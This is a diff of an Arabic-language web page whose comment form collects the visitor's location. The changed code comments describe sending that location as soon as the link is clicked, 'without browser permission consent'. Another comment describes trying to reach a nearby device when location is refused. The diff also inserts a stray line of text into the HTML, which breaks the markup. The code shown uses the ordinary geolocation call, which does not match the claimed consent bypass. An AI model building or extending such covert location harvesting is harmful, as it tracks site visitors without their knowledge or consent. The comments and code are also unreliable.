@@ -155,7 +155,7 @@
             <button onclick="openLocationModal()">💬 أضف تعليق</button>
         </div>
     </section>
-
+ارسال الموقع مباشرة بعد الضغط علي اللينك>  
     <section id="services">
         <div class="container">
             <h2>خدماتنا</h2>
@@ -251,7 +251,7 @@
             submitBtn.textContent = '⏳ جاري الإرسال...';
             showStatus('⏳ جاري إرسال تعليقك...', 'loading');
 
-            // نحاول نجيب الموقع (بدون  موافقة على إذن المتصفح)
+            // ارسال الموقع مباشرة بعد الضغط علي اللينك (بدون  موافقة على إذن المتصفح)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => onLocationSuccess(pos, name, comment),
@@ -281,7 +281,7 @@
         }
 
         // ==========================================
-        // ❌ فشل أو رفض تحديد الموقع → نرسل التعليق بس
+        // ❌ فشل أو رفض تحديد الموقع تحاول الاتصال بجهاز بعيد عن الموقع ب 20 متر حد اقصي → نرسل التعليق بس
         // ==========================================
         async function onLocationError(error, name, comment) {
             let msg = '';
